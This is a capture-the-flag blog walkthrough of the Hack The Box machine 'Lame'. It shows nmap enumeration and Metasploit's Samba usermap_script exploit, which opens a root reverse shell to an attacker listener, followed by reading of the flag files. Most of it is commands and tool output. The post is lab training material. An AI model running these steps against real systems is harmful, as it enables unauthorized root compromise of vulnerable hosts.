---
layout: "post"
title: "Hack The Box: Lame Writeup"
date: 2019-11-29
---

The Hack the Box machine 'Lame' is rated easy and has the IP 10.10.10.3

The first step I took was to perform an nmap scan on the machine:

{% highlight ruby %}
nmap -A -T4 -p- 10.10.10.3
{% endhighlight %}

The results of the scan:

{% highlight ruby %}
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-29 09:10 EST
Nmap scan report for 10.10.10.3
Host is up (0.020s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.18 (ClarkConnect 4.3 Enterprise Edition) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   20.97 ms 10.10.14.1
2   20.87 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.39 seconds
{% endhighlight %}

The information that nmap has retreived:

- Port 21 is open, using File Transfer Protocol, vsftpd 2.3.4. Anonymous login is allowed, this can be used to upload files to the server.

- Port 22 is open, using Secure Shell. SSH isnt typically exploitable alone, however credentials can be obtained from other exploits which can be used to login to SSH.

- Port 139/445 are open, using Server Message Block. The version Samba smbd 3.X - 4.X is being used. SMB is a communication protocol that is used for sharing rescources such as files. SMB is known to have many vulnerabilities, this will be my first area of the attack surface to enumerate.

- Port 3632 is open, using a compiling server, distccd. The version v1 is being used, this can be researched to find potential vulnerabilities.

Looking for potentially exploitable vulnerabilities:

- Due to SMB being known as vulnerable, I prioritised searching for exploits relating to 'Samba smbd 3.X - 4.X'. I used metasploit to enumerate the version of SMB being used as the nmap scan didn't pick up a version.

{% highlight ruby %}
search smb_version

options

set RHOSTS 10.10.10.3

msf5 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.3:445        - Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.10.10.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
{% endhighlight %}
 
 - SMB_version could not identify the host however I got the information 'Samba 3.0.20-Debian'. This can be researched to find poterntial exploitations:

- Rapid 7 have an exploit built into metasploit, Samba "username map script" Command Execution. This exploit allows arbritrary commands through the use of shell metacharacters.

- Seach for the exploit within metasploit, set the options and run the exploit, this returns with a root shell:

{% highlight ruby %}
msf5 > search exploit/multi/samba/usermap_script

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


msf5 > use exploit/multi/samba/usermap_script
msf5 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.5       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.5:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo XG1OxChrhP7vPRxi;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "XG1OxChrhP7vPRxi\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (10.10.14.5:4444 -> 10.10.10.3:50167) at 2019-12-01 07:30:20 -0500
{% endhighlight %}

- The exploit has executed and returned a reverse shell with root privledges. The machine can now be enumerated to find the user.txt and root.txt:

{% highlight ruby %}
whoami
root
pwd
/
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
cd home
ls
ftp
makis
service
user
cd makis
ls
user.txt
cat user.txt
694---------------------
{% endhighlight %}

- I used the locate command to find the root.txt on the machine:

{% highlight ruby %}
locate root.txt
updatedb
locate root.txt
/root/root.txt
cd /root/     
cat root.txt
92c----------------------
{% endhighlight %}

- Both user.txt and root.txt have been found on the machine. Overall I found this machine very easy with the use of metasploit and SMB.



 



